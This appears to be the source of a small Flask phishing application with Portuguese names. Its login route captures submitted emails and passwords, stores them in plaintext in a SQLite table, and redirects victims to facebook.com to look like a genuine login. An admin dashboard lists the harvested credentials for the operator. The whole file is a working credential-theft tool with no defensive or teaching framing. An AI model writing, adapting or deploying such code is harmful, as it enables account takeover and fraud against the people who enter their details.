from flask import Flask, render_template, request, redirect, session
import sqlite3
from datetime import datetime

app = Flask(__name__)
app.secret_key = "segredo_super_secreto"

def salvar_credenciais(email, senha):
    conn = sqlite3.connect("database/database.db")
    cursor = conn.cursor()
    cursor.execute("INSERT INTO credenciais (email, senha) VALUES (?, ?)", (email, senha))
    conn.commit()
    conn.close()

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        email = request.form["email"]
        senha = request.form["senha"]
        salvar_credenciais(email, senha)
        return redirect("https://facebook.com")
    return render_template("login.html")

@app.route("/admin", methods=["GET", "POST"])
def admin_login():
    if request.method == "POST":
        usuario = request.form["usuario"]
        senha = request.form["senha"]
        conn = sqlite3.connect("database/database.db")
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM admin WHERE usuario=? AND senha=?", (usuario, senha))
        admin = cursor.fetchone()
        conn.close()
        if admin:
            session["admin"] = True
            return redirect("/dashboard")
    return render_template("admin_login.html")

@app.route("/dashboard")
def dashboard():
    if not session.get("admin"):
        return redirect("/admin")
    conn = sqlite3.connect("database/database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM credenciais ORDER BY data_hora DESC")
    dados = cursor.fetchall()
    conn.close()
    return render_template("dashboard.html", dados=dados)

if __name__ == "__main__":
    app.run(debug=True)
